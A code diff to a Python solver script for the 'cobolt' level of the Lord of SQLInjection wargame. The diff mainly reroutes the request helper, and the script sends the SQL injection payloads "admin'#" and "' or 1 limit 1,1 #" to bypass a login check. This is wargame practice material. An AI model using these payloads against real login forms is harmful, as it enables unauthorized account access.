@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 import los
 import los_cookies
+from connect import my_request as req
 
 
 def main():
@@ -19,8 +20,8 @@ def main():
     url = "https://los.rubiya.kr/chall/cobolt_b876ab5595253427d3bc34f1cd8f30db.php"
     cook = los_cookies.check_cookies(url)
 
-    param = dict(id="admin'#") # (id="' or 1 limit 1,1 #")
-    response = los.get_request(url, param, cook)
+    param = dict(id="admin'#")  # (id="' or 1 limit 1,1 #")
+    response = req.get_request(url, param, cook)
 
     if 'Clear!' in response:
         print('COBOLT Clear!')
